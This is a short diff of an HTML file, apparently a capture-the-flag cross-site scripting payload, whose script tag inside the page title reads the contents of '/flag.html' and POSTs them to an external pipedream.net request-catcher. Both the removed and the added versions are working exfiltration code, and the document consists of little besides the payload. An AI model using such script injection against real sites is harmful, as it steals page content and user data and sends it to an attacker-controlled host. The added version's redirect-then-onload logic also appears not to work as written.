@@ -2,15 +2,15 @@
 <html>
 <head>
     <title><script>
-    fetch('/flag.html')
-      .then(response => response.text())
-      .then(data => {
+    window.location.href = '/flag.html';
+    window.onload = () => {
+        const flag = document.body.innerText || document.body.textContent;
         fetch('https://eownbmaqeyx6p8e.m.pipedream.net', {
           method: 'POST',
-          body: data
-        });
-      })
-      .catch(error => console.error('Error fetching flag:', error));
+          body: flag
+        })
+        .catch(error => console.error('Error sending flag:', error));
+    };
     </script></title>
 </head>
 <body>
